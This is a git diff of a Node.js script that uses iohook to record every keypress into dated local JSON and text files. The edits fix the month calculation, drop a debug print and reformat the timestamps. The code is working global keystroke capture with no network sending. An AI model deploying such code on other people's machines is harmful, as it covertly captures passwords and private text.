@@ -3,7 +3,7 @@ var iohook = require("iohook");
 let fs = require("fs");
 let d = new Date();
 let date = d.getDate() < 10 ? "0" + d.getDate() : d.getDate();
-let month = d.getMonth() < 10 ? "0" + d.getMonth() : d.getMonth();
+let month = d.getMonth() + 1 < 10 ? "0" + (d.getMonth() + 1) : (d.getMonth() + 1);
 let dir = `history/${date}${month}${d.getFullYear()}`
 let log = `${dir}/log.json`
 let text = `${dir}/text.txt`;
@@ -24,7 +24,6 @@ if (!fs.existsSync(text)) {
 let sessionText = "";
 var sessionTime;
 iohook.on("keypress", e => {
-    console.log(e)
     clearTimeout(sessionTime)
     if (e.keychar == 8) {
         sessionText = sessionText.slice(0, -1)
@@ -44,13 +43,13 @@ iohook.on("keypress", e => {
         let texts = fs.readFileSync(text, "utf-8");
         let parseLogs = JSON.parse(logs);
 
-        let date = d.getDate() < 10 ? "0" + d.getDate() : d.getDate();
-        let month = d.getMonth() < 10 ? "0" + d.getMonth() : d.getMonth();
+        let d = new Date();
+
         let hours = d.getHours() < 10 ? "0" + d.getHours() : d.getHours();
         let minutes = d.getMinutes() < 10 ? "0" + d.getMinutes() : d.getMinutes();
         let seconds = d.getSeconds() < 10 ? "0" + d.getSeconds() : d.getSeconds();
-        
-        sessionText = `${date}-${month}-${d.getFullYear()} ${hours}-${minutes}-${seconds}\n${sessionText}\n`
+
+        sessionText = `Date: ${date}-${month}-${d.getFullYear()}  Time: ${hours}-${minutes}-${seconds}\n${sessionText}\n`
         
         parseLogs.push({...e, time: `${d.getDate()}-${d.getMonth()}-${d.getFullYear()} ${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`})
         fs.writeFileSync(text, texts + sessionText, "utf-8")
